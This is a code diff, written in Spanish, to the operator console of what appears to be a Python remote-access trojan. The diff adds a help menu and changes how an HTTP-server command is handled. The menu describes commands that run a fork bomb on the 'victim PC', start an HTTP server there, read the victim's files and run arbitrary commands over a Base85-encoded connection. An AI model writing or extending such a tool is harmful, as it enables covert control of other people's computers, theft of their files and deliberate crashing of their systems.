@@ -93,8 +93,8 @@ def _MAIN():
 
                     elif str(command) == 'HttpServer':
                         _CodingBase85Text(self.Client, str('HttpServer'))
-                        PortHttp = int(input("introduce el puerto que abrir: "))
-                        _CodingBase85Text(self.Client, str(PortHttp))
+                        #PortHttp = int(input("introduce el puerto que abrir: "))
+                        #_CodingBase85Text(self.Client, str(PortHttp))
                         print(_DecodingBase85Text(self.Client, 8000))
 
                     elif str(command) == 'CloseHttpServer':
@@ -124,6 +124,31 @@ def _MAIN():
                             print(a)
                         elif _type == 'no binary':
                             print(str(_DecodingBase85Text(self.Client, self.buffer)))
+
+                    elif str(command) == 'help' or str(command) == 'ayuda':
+                        print("""
+                        ---------------------------------------------------------------
+                        -                      comandos disponibles                    -
+                        ----------------------------------------------------------------
+                        -exit                      con este finalizas las conesiones   -
+                        ----------------------------------------------------------------
+                        -cd                con este pordras desplazarte entre carpetas -
+                        ----------------------------------------------------------------
+                        -BombFork          este ejecuta una bomba fork en el pc victima-
+                        ----------------------------------------------------------------
+                        -cwd                    para poder ver la ruta del directorio  -
+                        ----------------------------------------------------------------
+                        -HttpServer           ejecuta un server Http en la pc victimma -
+                        ----------------------------------------------------------------
+                        -CloseHttpServer                 finaliza el server http       -
+                        ----------------------------------------------------------------
+                        -cd ..                         retrocede un directorio         -
+                        ----------------------------------------------------------------
+                        -read                           lee archivos de la pc victima  -
+                        ----------------------------------------------------------------
+                        - otros comandos compatibles con el dispositivo de la victima  -
+                        ----------------------------------------------------------------
+                        """)
 
                     else:
 
